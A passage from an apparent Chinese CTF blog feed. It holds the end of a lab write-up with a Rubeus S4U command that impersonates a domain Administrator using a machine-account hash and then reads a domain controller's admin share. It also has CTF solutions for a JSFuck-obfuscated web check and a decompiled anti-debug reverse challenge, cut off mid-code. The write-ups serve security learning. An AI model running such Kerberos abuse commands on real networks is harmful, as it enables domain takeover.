cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmd">.\Rubeus.exe s4u /user:MSSQLSERVER$ /rc4:aca5ebbdd95f1c76b5d201c37d3d345b /domain:xiaorang.lab /dc:DC.xiaorang.lab  /impersonateuser:Administrator /msdsspn:CIFS/DC.xiaorang.lab /ptt<br></code></pre></td></tr></table></figure><p>进入域控目录，Windows 文件共享的 UNC 路径</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmd">\\DC.xiaorang.lab\C$\Users\Administrator\flag<br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/dd9be6a17794b7bb.png"></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">flag04</span>: flag&#123;<span class="hljs-number">126</span>d2f61-<span class="hljs-number">43</span>e0-<span class="hljs-number">42</span>e7-b6ff-<span class="hljs-number">3</span>f61946c3f67&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>渗透</category>
      
      <category>靶机</category>
      
      <category>春秋云镜</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Redis Wordpress S4U</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2025 第十届上海市大学生网络安全大赛暨&quot;磐石行动&quot;-初赛</title>
    <link href="/2025/08/12/2025%E7%AC%AC%E5%8D%81%E5%B1%8A%E4%B8%8A%E6%B5%B7%E5%B8%82%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B%E6%9A%A8%E7%A3%90%E7%9F%B3%E8%A1%8C%E5%8A%A8-%E5%88%9D%E8%B5%9B/"/>
    <url>/2025/08/12/2025%E7%AC%AC%E5%8D%81%E5%B1%8A%E4%B8%8A%E6%B5%B7%E5%B8%82%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B%E6%9A%A8%E7%A3%90%E7%9F%B3%E8%A1%8C%E5%8A%A8-%E5%88%9D%E8%B5%9B/</url>
    
    <content type="html"><![CDATA[<h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="ezDecryption"><a href="#ezDecryption" class="headerlink" title="ezDecryption"></a>ezDecryption</h2><p>f12 找到 hint，第一关验证码为 2025</p><p><img src="https://img.dkdun.cn/v1/2025/12/f7d66b262cd16edd.png"></p><p>抓包修改数据包直接跳过第二关</p><p><img src="https://img.dkdun.cn/v1/2025/12/b0033f6b2cf0add7.png"></p><p>查看 js 代码，发现有 jsFuck 加密和 base 加密</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-attr">validateCode</span>: <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;<br>        <span class="hljs-comment">// 这里包含验证逻辑</span><br>        <span class="hljs-keyword">const</span> _0x1 = [][(![] + [])[+!+[]] + (!![] + [])[+[]]][([][(![] + [])[+!+[]] + (!![] + [])[+[]]] + [])[!+[] + !+[] + !+[]] + (!![] + [][(![] + [])[+!+[]] + (!![] + [])[+[]]])[+!+[] + [+[]]] + ([][[]] + [])[+!+[]] + (![] + [])[!+[] + !+[] + !+[]] + (!![] + [])[+[]] + (!![] + [])[+!+[]] + ([][[]] + [])[+[]] + ([][(![] + [])[+!+[]] + (!![] + [])[+[]]] + [])[!+[] + !+[] + !+[]] + (!![] + [])[+[]] + (!![] + [][(![] + [])[+!+[]] + (!![] + [])[+[]]])[+!+[] + [+[]]] + (!![] + [])[+!+[]]]((!![] + [])[+!+[]] + (!![] + [])[!+[] + !+[] + !+[]] + (!![] + [])[+[]] + ([][[]] + [])[+[]] + (!![] + [])[+!+[]] + ([][[]] + [])[+!+[]] + (+[![]] + [][(![] + [])[+!+[]] + (!![] + [])[+[]]])[+!+[] + [+!+[]]] + (!![] + [])[!+[] + !+[] + !+[]] + (+(!+[] + !+[] + !+[] + [+!+[]]))[(!![] + [])[+[]] + (!![] + [][(![] + [])[+!+[]] + (!![] + [])[+[]]])[+!+[] + [+[]]] + ([] + [])[([][(![] + [])[+!+[]] + (!![] + [])[+[]]] + [])[!+[] + !+[] + !+[]] + (!![] + [][(![] + [])[+!+[]] + (!![] + [])[+[]]])[+!+[] + [+[]]] + ([][[]] + [])[+!+[]] + (![] + [])[!+[] + !+[] + !+[]] + (!![] + [])[+[]] + (!![] + [])[+!+[]] + ([][[]] + [])[+[]] + ([][(![] + [])[+!+[]] + (!![] + [])[+[]]] + [])[!+[] + !+[] + !+[]] + (!![] + [])[+[]] + (!![] + [][(![] + [])[+!+[]] + (!![] + [])[+[]]])[+!+[] + [+[]]] + (!![] + [])[+!+[]]][([][[]] + [])[+!+[]] + (![] + [])[+!+[]] + ((+[])[([][(![] + [])[+!+[]] + (!![] + [])[+[]]] + [])[!+[] + !+[] + !+[]] + (!![] + [][(![] + [])[+!+[]] + (!![] + [])[+[]]])[+!+[] + [+[]]] + ([][[]] + [])[+!+[]] + (![] + [])[!+[] + !+[] + !+[]] + (!![] + [])[+[]] + (!![] + [])[+!+[]] + ([][[]] + [])[+[]] + ([][(![] + [])[+!+[]] + (!![] + [])[+[]]] + [])[!+[] + !+[] + !+[]] + (!![] + [])[+[]] + (!![] + [][(![] + [])[+!+[]] + (!![] + [])[+[]]])[+!+[] + [+[]]] + (!![] + [])[+!+[]]] + [])[+!+[] + [+!+[]]] + (!![] + [])[!+[] + !+[] + !+[]]]](!+[] + !+[] + !+[] + [!+[] + !+[]]) + (![] + [])[+!+[]] + (![] + [])[!+[] + !+[]])()((![] + [])[+!+[]] + (!![] + [])[+[]] + (!![] + [][(![] + [])[+!+[]] + (!![] + [])[+[]]])[+!+[] + [+[]]] + ([][(!![] + [])[!+[] + !+[] + !+[]] + ([][[]] + [])[+!+[]] + (!![] + [])[+[]] + (!![] + [])[+!+[]] + ([![]] + [][[]])[+!+[] + [+[]]] + (!![] + [])[!+[] + !+[] + !+[]] + (![] + [])[!+[] + !+[] + !+[]]]() + [])[!+[] + !+[]] + ([][(![] + [])[+!+[]] + (!![] + [])[+[]]] + [])[+!+[] + [+!+[]]] + ([] + [])[(![] + [])[+[]] + (!![] + [][(![] + [])[+!+[]] + (!![] + [])[+[]]])[+!+[] + [+[]]] + ([][[]] + [])[+!+[]] + (!![] + [])[+[]] + ([][(![] + [])[+!+[]] + (!![] + [])[+[]]] + [])[!+[] + !+[] + !+[]] + (!![] + [][(![] + [])[+!+[]] + (!![] + [])[+[]]])[+!+[] + [+[]]] + (![] + [])[!+[] + !+[]] + (!![] + [][(![] + [])[+!+[]] + (!![] + [])[+[]]])[+!+[] + [+[]]] + (!![] + [])[+!+[]]]()[+!+[] + [!+[] + !+[]]] + ([][(![] + [])[+!+[]] + (!![] + [])[+[]]] + [])[!+[] + !+[] + !+[]] + (![] + [][(![] + [])[+!+[]] + (!![] + [])[+[]]][([][(![] + [])[+!+[]] + (!![] + [])[+[]]] + [])[!+[] + !+[] + !+[]] + (!![] + [][(![] + [])[+!+[]] + (!![] + [])[+[]]])[+!+[] + [+[]]] + ([][[]] + [])[+!+[]] + (![] + [])[!+[] + !+[] + !+[]] + (!![] + [])[+[]] + (!![] + [])[+!+[]] + ([][[]] + [])[+[]] + ([][(![] + [])[+!+[]] + (!![] + [])[+[]]] + [])[!+[] + !+[] + !+[]] + (!![] + [])[+[]] + (!![] + [][(![] + [])[+!+[]] + (!![] + [])[+[]]])[+!+[] + [+[]]] + (!![] + [])[+!+[]]]((!![] + [])[+!+[]] + (!![] + [])[!+[] + !+[] + !+[]] + (!![] + [])[+[]] + ([][[]] + [])[+[]] + (!![] + [])[+!+[]] + ([][[]] + [])[+!+[]] + (+[![]] + [][(![] + [])[+!+[]] + (!![] + [])[+[]]])[+!+[] + [+!+[]]] + [][(![] + [])[+!+[]] + (!![] + [])[+[]]][([][(![] + [])[+!+[]] + (!![] + [])[+[]]] + [])[!+[] + !+[] + !+[]] + (!![] + [][(![] + [])[+!+[]] + (!![] + [])[+[]]])[+!+[] + [+[]]] + ([][[]] + [])[+!+[]] + (![] + [])[!+[] + !+[] + !+[]] + (!![] + [])[+[]] + (!![] + [])[+!+[]] + ([][[]] + [])[+[]] + ([][(![] + [])[+!+[]] + (!![] + [])[+[]]] + [])[!+[] + !+[] + !+[]] + (!![] + [])[+[]] + (!![] + [][(![] + [])[+!+[]] + (!![] + [])[+[]]])[+!+[] + [+[]]] + (!![] + [])[+!+[]]]((!![] + [])[+!+[]] + (!![] + [])[!+[] + !+[] + !+[]] + (!![] + [])[+[]] + ([][[]] + [])[+[]] + (!![] + [])[+!+[]] + ([][[]] + [])[+!+[]] + (+[![]] + [][(![] + [])[+!+[]] + (!![] + [])[+[]]])[+!+[] + [+!+[]]] + (!![] + [])[!+[] + !+[] + !+[]] + (![] + [])[!+[] + !+[] + !+[]] + ([][(![] + [])[+!+[]] + (!![] + [])[+[]]] + [])[!+[] + !+[] + !+[]] + (![] + [])[+!+[]] + (+(!+[] + !+[] + [+!+[]] + [+!+[]]))[(!![] + [])[+[]] + (!![] + [][(![] + [])[+!+[]] + (!![] + [])[+[]]])[+!+[] + [+[]]] + ([] + [])[([][(![] + [])[+!+[]] + (!![] + [])[+[]]] + [])[!+[] + !+[] + !+[]] + (!![] + [][(![] + [])[+!+[]] + (!![] + [])[+[]]])[+!+[] + [+[]]] + ([][[]] + [])[+!+[]] + (![] + [])[!+[] + !+[] + !+[]] + (!![] + [])[+[]] + (!![] + [])[+!+[]] + ([][[]] + [])[+[]] + ([][(![] + [])[+!+[]] + (!![] + [])[+[]]] + [])[!+[] + !+[] + !+[]] + (!![] + [])[+[]] + (!![] + [][(![] + [])[+!+[]] + (!![] + [])[+[]]])[+!+[] + [+[]]] + (!![] + [])[+!+[]]][([][[]] + [])[+!+[]] + (![] + [])[+!+[]] + ((+[])[([][(![] + [])[+!+[]] + (!![] + [])[+[]]] + [])[!+[] + !+[] + !+[]] + (!![] + [][(![] + [])[+!+[]] + (!![] + [])[+[]]])[+!+[] + [+[]]] + ([][[]] + [])[+!+[]] + (![] + [])[!+[] + !+[] + !+[]] + (!![] + [])[+[]] + (!![] + [])[+!+[]] + ([][[]] + [])[+[]] + ([][(![] + [])[+!+[]] + (!![] + [])[+[]]] + [])[!+[] + !+[] + !+[]] + (!![] + [])[+[]] + (!![] + [][(![] + [])[+!+[]] + (!![] + [])[+[]]])[+!+[] + [+[]]] + (!![] + [])[+!+[]]] + [])[+!+[] + [+!+[]]] + (!![] + [])[!+[] + !+[] + !+[]]]](!+[] + !+[] + !+[] + [+!+[]])[+!+[]] + (!![] + [])[!+[] + !+[] + !+[]])()([][(![] + [])[+!+[]] + (!![] + [])[+[]]])[(![] + [])[+!+[]] + (!![] + [])[+[]]]((+((+(+!+[] + [+!+[]] + (!![] + [])[!+[] + !+[] + !+[]] + [!+[] + !+[]] + [+[]]) + [])[+!+[]] + [+[] + [+[]] + [+[]] + [+[]] + [+[]] + [+[]] + [+!+[]]]) + [])[!+[] + !+[]] + [+!+[]]) + (![] + [])[+!+[]] + (!![] + [])[+[]] + (!![] + [])[!+[] + !+[] + !+[]])()())[!+[] + !+[] + !+[] + [+[]]] + (+[] + [][(![] + [])[+!+[]] + (!![] + [])[+[]]][([][(![] + [])[+!+[]] + (!![] + [])[+[]]] + [])[!+[] + !+[] + !+[]] + (!![] + [][(![] + [])[+!+[]] + (!![] + [])[+[]]])[+!+[] + [+[]]] + ([][[]] + [])[+!+[]] + (![] + [])[!+[] + !+[] + !+[]] + (!![] + [])[+[]] + (!![] + [])[+!+[]] + ([][[]] + [])[+[]] + ([][(![] + [])[+!+[]] + (!![] + [])[+[]]] + [])[!+[] + !+[] + !+[]] + (!![] + [])[+[]] + (!![] + [][(![] + [])[+!+[]] + (!![] + [])[+[]]])[+!+[] + [+[]]] + (!![] + [])[+!+[]]])[+!+[] + [+[]]] + ([][[]] + [])[+[]] + ([][(![] + [])[+!+[]] + (!![] + [])[+[]]] + [])[!+[] + !+[] + !+[]] + [!+[] + !+[]] + (+(+!+[] + [+[]] + [+!+[]]))[(!![] + [])[+[]] + (!![] + [][(![] + [])[+!+[]] + (!![] + [])[+[]]])[+!+[] + [+[]]] + ([] + [])[([][(![] + [])[+!+[]] + (!![] + [])[+[]]] + [])[!+[] + !+[] + !+[]] + (!![] + [][(![] + [])[+!+[]] + (!![] + [])[+[]]])[+!+[] + [+[]]] + ([][[]] + [])[+!+[]] + (![] + [])[!+[] + !+[] + !+[]] + (!![] + [])[+[]] + (!![] + [])[+!+[]] + ([][[]] + [])[+[]] + ([][(![] + [])[+!+[]] + (!![] + [])[+[]]] + [])[!+[] + !+[] + !+[]] + (!![] + [])[+[]] + (!![] + [][(![] + [])[+!+[]] + (!![] + [])[+[]]])[+!+[] + [+[]]] + (!![] + [])[+!+[]]][([][[]] + [])[+!+[]] + (![] + [])[+!+[]] + ((+[])[([][(![] + [])[+!+[]] + (!![] + [])[+[]]] + [])[!+[] + !+[] + !+[]] + (!![] + [][(![] + [])[+!+[]] + (!![] + [])[+[]]])[+!+[] + [+[]]] + ([][[]] + [])[+!+[]] + (![] + [])[!+[] + !+[] + !+[]] + (!![] + [])[+[]] + (!![] + [])[+!+[]] + ([][[]] + [])[+[]] + ([][(![] + [])[+!+[]] + (!![] + [])[+[]]] + [])[!+[] + !+[] + !+[]] + (!![] + [])[+[]] + (!![] + [][(![] + [])[+!+[]] + (!![] + [])[+[]]])[+!+[] + [+[]]] + (!![] + [])[+!+[]]] + [])[+!+[] + [+!+[]]] + (!![] + [])[!+[] + !+[] + !+[]]]](!+[] + !+[] + [+!+[]])[+!+[]] + (+(!+[] + !+[] + [+!+[]] + [+!+[]]))[(!![] + [])[+[]] + (!![] + [][(![] + [])[+!+[]] + (!![] + [])[+[]]])[+!+[] + [+[]]] + ([] + [])[([][(![] + [])[+!+[]] + (!![] + [])[+[]]] + [])[!+[] + !+[] + !+[]] + (!![] + [][(![] + [])[+!+[]] + (!![] + [])[+[]]])[+!+[] + [+[]]] + ([][[]] + [])[+!+[]] + (![] + [])[!+[] + !+[] + !+[]] + (!![] + [])[+[]] + (!![] + [])[+!+[]] + ([][[]] + [])[+[]] + ([][(![] + [])[+!+[]] + (!![] + [])[+[]]] + [])[!+[] + !+[] + !+[]] + (!![] + [])[+[]] + (!![] + [][(![] + [])[+!+[]] + (!![] + [])[+[]]])[+!+[] + [+[]]] + (!![] + [])[+!+[]]][([][[]] + [])[+!+[]] + (![] + [])[+!+[]] + ((+[])[([][(![] + [])[+!+[]] + (!![] + [])[+[]]] + [])[!+[] + !+[] + !+[]] + (!![] + [][(![] + [])[+!+[]] + (!![] + [])[+[]]])[+!+[] + [+[]]] + ([][[]] + [])[+!+[]] + (![] + [])[!+[] + !+[] + !+[]] + (!![] + [])[+[]] + (!![] + [])[+!+[]] + ([][[]] + [])[+[]] + ([][(![] + [])[+!+[]] + (!![] + [])[+[]]] + [])[!+[] + !+[] + !+[]] + (!![] + [])[+[]] + (!![] + [][(![] + [])[+!+[]] + (!![] + [])[+[]]])[+!+[] + [+[]]] + (!![] + [])[+!+[]]] + [])[+!+[] + [+!+[]]] + (!![] + [])[!+[] + !+[] + !+[]]]](!+[] + !+[] + !+[] + [+!+[]])[+!+[]] + ([] + [])[(![] + [])[+[]] + (!![] + [][(![] + [])[+!+[]] + (!![] + [])[+[]]])[+!+[] + [+[]]] + ([][[]] + [])[+!+[]] + (!![] + [])[+[]] + ([][(![] + [])[+!+[]] + (!![] + [])[+[]]] + [])[!+[] + !+[] + !+[]] + (!![] + [][(![] + [])[+!+[]] + (!![] + [])[+[]]])[+!+[] + [+[]]] + (![] + [])[!+[] + !+[]] + (!![] + [][(![] + [])[+!+[]] + (!![] + [])[+[]]])[+!+[] + [+[]]] + (!![] + [])[+!+[]]]()[+!+[] + [!+[] + !+[]]] + ([] + [] + [][(![] + [])[+!+[]] + (!![] + [])[+[]]])[+!+[] + [!+[] + !+[]]] + ([] + [])[(![] + [])[+[]] + (!![] + [][(![] + [])[+!+[]] + (!![] + [])[+[]]])[+!+[] + [+[]]] + ([][[]] + [])[+!+[]] + (!![] + [])[+[]] + ([][(![] + [])[+!+[]] + (!![] + [])[+[]]] + [])[!+[] + !+[] + !+[]] + (!![] + [][(![] + [])[+!+[]] + (!![] + [])[+[]]])[+!+[] + [+[]]] + (![] + [])[!+[] + !+[]] + (!![] + [][(![] + [])[+!+[]] + (!![] + [])[+[]]])[+!+[] + [+[]]] + (!![] + [])[+!+[]]](+[![]] + ([] + [])[(![] + [])[+[]] + (!![] + [][(![] + [])[+!+[]] + (!![] + [])[+[]]])[+!+[] + [+[]]] + ([][[]] + [])[+!+[]] + (!![] + [])[+[]] + ([][(![] + [])[+!+[]] + (!![] + [])[+[]]] + [])[!+[] + !+[] + !+[]] + (!![] + [][(![] + [])[+!+[]] + (!![] + [])[+[]]])[+!+[] + [+[]]] + (![] + [])[!+[] + !+[]] + (!![] + [][(![] + [])[+!+[]] + (!![] + [])[+[]]])[+!+[] + [+[]]] + (!![] + [])[+!+[]]]()[+!+[] + [!+[] + !+[]]])[!+[] + !+[] + [+!+[]]])<br>        <span class="hljs-keyword">const</span> _0x2 = <span class="hljs-title function_">atob</span>(<span class="hljs-string">&quot;Mm9aNQ==&quot;</span>);<br>        <span class="hljs-keyword">const</span> secretCode = _0x1 + _0x2;<br>        <span class="hljs-keyword">return</span> secretCode;<br>    &#125;<br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/12ab76132b8609b5.png"></p><p><img src="https://img.dkdun.cn/v1/2025/12/3205d971e5c3eb45.png"></p><p>解密密文构造 secretCode</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gcode">pa<span class="hljs-symbol">nshi2</span>oZ<span class="hljs-number">5</span><br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/98f62dcf7ba2a78d.png"></p><p>拿到 flag</p><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="language-xml">flag</span><span class="hljs-template-variable">&#123;d1g1t4l_l0ck_br34k3r_2025&#125;</span><br></code></pre></td></tr></table></figure><h1 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h1><h2 id="EasyRe"><a href="#EasyRe" class="headerlink" title="EasyRe"></a>EasyRe</h2><p>定位到 mian 函数，输入的字符串经过加密后进行逐字节比较是否相同</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> __fastcall <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **argv, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>  HANDLE CurrentProcess; <span class="hljs-comment">// rax</span><br>  FILE *v4; <span class="hljs-comment">// rax</span><br>  __int64 v5; <span class="hljs-comment">// rsi</span><br>  __int64 v6; <span class="hljs-comment">// rbx</span><br>  <span class="hljs-type">unsigned</span> __int64 v7; <span class="hljs-comment">// rax</span><br>  __int64 v8; <span class="hljs-comment">// rdi</span><br>  <span class="hljs-type">int</span> v9; <span class="hljs-comment">// ecx</span><br>  <span class="hljs-type">int</span> i; <span class="hljs-comment">// r8d</span><br>  <span class="hljs-type">int</span> v11; <span class="hljs-comment">// ecx</span><br>  <span class="hljs-type">int</span> v12; <span class="hljs-comment">// ecx</span><br>  __int64 v13; <span class="hljs-comment">// r8</span><br>  <span class="hljs-type">int</span> v14; <span class="hljs-comment">// eax</span><br>  <span class="hljs-type">int</span> v15; <span class="hljs-comment">// ecx</span><br>  <span class="hljs-type">int</span> v16; <span class="hljs-comment">// edx</span><br>  <span class="hljs-type">int</span> v17; <span class="hljs-comment">// eax</span><br>  BOOL v18; <span class="hljs-comment">// edx</span><br>  __int64 v19; <span class="hljs-comment">// rcx</span><br>  <span class="hljs-type">const</span> <span class="hljs-type">char</span> *v20; <span class="hljs-comment">// rcx</span><br>  BOOL pbDebuggerPresent; <span class="hljs-comment">// [rsp+20h] [rbp-108h] BYREF</span><br>  <span class="hljs-type">char</span> v23[<span class="hljs-number">112</span>]; <span class="hljs-comment">// [rsp+30h] [rbp-F8h] BYREF</span><br>  <span class="hljs-type">char</span> v24[<span class="hljs-number">112</span>]; <span class="hljs-comment">// [rsp+A0h] [rbp-88h] BYREF</span><br><br>  <span class="hljs-keyword">if</span> ( IsDebuggerPresent()<br>    || (pbDebuggerPresent = <span class="hljs-number">0</span>,<br>        CurrentProcess = GetCurrentProcess(),<br>        CheckRemoteDebuggerPresent(CurrentProcess, &amp;pbDebuggerPresent),<br>        pbDebuggerPresent)<br>    || (SetLastError(<span class="hljs-number">0</span>), OutputDebugStringA(<span class="hljs-string">&quot;DebuggerTest&quot;</span>), GetLastError()) )<br>  &#123;<br>    sub_140001010(<span class="hljs-string">&quot;Nothing to see here...\n&quot;</span>);<br>    sub_140004C04(<span class="hljs-string">&quot;pause&quot;</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>  &#125;<br>  <span class="hljs-keyword">else</span><br>  &#123;<br>    sub_140001010(<span class="hljs-string">&quot;Please enter the flag: &quot;</span>);<br>    v4 = _acrt_iob_func(<span class="hljs-number">0</span>);<br>    common_fgets&lt;<span class="hljs-type">char</span>&gt;(v24, <span class="hljs-number">100</span>i64, v4);<br>    v5 = <span class="hljs-number">-1</span>i64;<br>    v6 = <span class="hljs-number">-1</span>i64;<br>    <span class="hljs-keyword">do</span><br>      ++v6;<br>    <span class="hljs-keyword">while</span> ( v24[v6] );<br>    v7 = (<span class="hljs-type">int</span>)v6 - <span class="hljs-number">1</span>i64;<br>    <span class="hljs-keyword">if</span> ( v24[v7] == <span class="hljs-number">10</span> )<br>    &#123;<br>      <span class="hljs-keyword">if</span> ( v7 &gt;= <span class="hljs-number">0x64</span> )<br>        _report_rangecheckfailure();<br>      v24[v7] = <span class="hljs-number">0</span>;<br>      LODWORD(v6) = v6 - <span class="hljs-number">1</span>;<br>    &#125;<br>    v8 = <span class="hljs-number">0</span>i64;<br>    <span class="hljs-built_in">strcpy</span>(v23, <span class="hljs-string">&quot;CBAZYX&quot;</span>);<br>    <span class="hljs-keyword">do</span><br>    &#123;<br>      <span class="hljs-keyword">if</span> ( v23[v8] == <span class="hljs-number">88</span> )<br>        sub_140001010(<span class="hljs-string">&quot;Found special character!\n&quot;</span>);<br>      ++v8;<br>    &#125;<br>    <span class="hljs-keyword">while</span> ( v8 &lt; <span class="hljs-number">6</span> );<br>    v9 = v6;<br>    <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">10</span>; ++i )<br>    &#123;<br>      <span class="hljs-keyword">if</span> ( (i &amp; <span class="hljs-number">1</span>) != <span class="hljs-number">0</span> )<br>        v11 = (v9 | <span class="hljs-number">0x10000</span>) &gt;&gt; <span class="hljs-number">1</span>;<br>      <span class="hljs-keyword">else</span><br>        v11 = (<span class="hljs-number">2</span> * v9) ^ <span class="hljs-number">0xABCD</span>;<br>      <span class="hljs-keyword">if</span> ( v11 % <span class="hljs-number">3</span> )<br>      &#123;<br>        <span class="hljs-keyword">if</span> ( v11 % <span class="hljs-number">3</span> == <span class="hljs-number">1</span> )<br>          v9 = v11 - i;<br>        <span class="hljs-keyword">else</span><br>          v9 = (<span class="hljs-number">16</span> * i) ^ v11;<br>      &#125;<br>      <span class="hljs-keyword">else</span><br>      &#123;<br>        v9 = i * i + v11;<br>      &#125;<br>    &#125;<br>    <span class="hljs-keyword">if</span> ( (<span class="hljs-type">unsigned</span> __int16)v9 == <span class="hljs-number">10</span> * ((<span class="hljs-type">unsigned</span> __int16)v9 / <span class="hljs-number">0xA</span>u) )<br>      sub_140001010(<span class="hljs-string">&quot;Processing...\n&quot;</span>);<br>    v12 = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">do</span><br>      ++v5;<br>    <span class="hljs-keyword">while</span> ( v24[v5] );<br>    <span class="hljs-keyword">if</span> ( (<span class="hljs-type">int</span>)v5 &gt; <span class="hljs-number">0</span> )<br>    &#123;<br>      v13 = <span class="hljs-number">0</span>i64;<br>      <span class="hljs-keyword">do</span><br>      &#123;<br>        v14 = v24[v13++];<br>        v12 = <span class="hljs-number">17</span> * (v12 + v14) % <span class="hljs-number">255</span>;<br>      &#125;<br>      <span class="hljs-keyword">while</span> ( v13 &lt; (<span class="hljs-type">int</span>)v5 );<br>      <span class="hljs-keyword">if</span> ( v12 == <span class="hljs-number">42</span> )<br>        sub_140001010(<span class="hljs-string">&quot;Interesting input...\n&quot;</span>);<br>    &#125;<br>    v15 = <span class="hljs-number">0</span>;<br>    v16 = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">if</span> ( (<span class="hljs-type">int</span>)v6 &gt; <span class="hljs-number">0</span> )<br>    &#123;<br>      <span class="hljs-keyword">do</span><br>      &#123;<br>        v17 = v16 + v15;<br>        v15 = v16 + v15 - <span class="hljs-number">100</span>;<br>        <span class="hljs-keyword">if</span> ( v17 &lt;= <span class="hljs-number">100</span> )<br>          v15 = v17;<br>        ++v16;<br>      &#125;<br>      <span class="hljs-keyword">while</span> ( v16 &lt; (<span class="hljs-type">int</span>)v6 );<br>      <span class="hljs-keyword">if</span> ( v15 == <span class="hljs-number">1337</span> )<br>        sub_140001010(<span class="hljs-string">&quot;You found a secret number!\n&quot;</span>);<br>    &#125;<br>    sub_140001070((__int64)v24, v6, v23);<br>    v18 = v6 == <span class="hljs-number">29</span>;<br>    <span class="hljs-keyword">if</span> ( (_DWORD)v6 == <span class="hljs-number">29</span> )<br>    &#123;<br>      v19 = <span class="hljs-number">0</span>i64;<br>      <span class="hljs-keyword">while</span> ( v23[v19] == word_14001D658[v19] )<br>      &#123;<br>        <span class="hljs-keyword">if</span> ( ++v19 &gt;= <span class="hljs-number">29</span> )<br>          <span class="hljs-keyword">goto</span> LABEL_44;<br>      &#125;<br>      v18 = <span class="hljs-number">0</span>;<br>    &#125;<br>LABEL_44:<br>    v20 = <span class="hljs-string">&quot;Congratulations! You found the correct flag!\n&quot;</span>;<br>    <span class="hljs-keyword">if</span> ( !v18 )<br>      